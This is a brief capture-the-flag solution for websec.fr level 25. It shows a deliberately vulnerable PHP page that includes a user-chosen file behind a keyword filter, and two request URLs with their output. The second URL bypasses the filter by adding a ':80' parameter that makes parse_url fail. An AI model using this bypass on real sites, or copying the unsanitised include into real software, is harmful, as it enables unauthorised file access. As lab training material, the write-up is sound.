```
<?php
                  parse_str(parse_url($_SERVER['REQUEST_URI'])['query'], $query);
                  foreach ($query as $k => $v) {
                      if (stripos($v, 'flag') !== false)
                          die('You are not allowed to get the flag, sorry :/');
                  }

                  include $_GET['page'] . '.txt';
                  ?>
```

"parse_url returns false when t has ':' in its parameters"

STEP 1: http://websec.fr/level25/index.php?page=flag
OUTPUT: You are not allowed to get the flag, sorry :/

STEP 2: http://websec.fr/level25/index.php?page=flag&b=:80
OUTPUT: WEBSEC{How_am_I_supposed_to_parse_uri_when_everything_is_so_broooken}
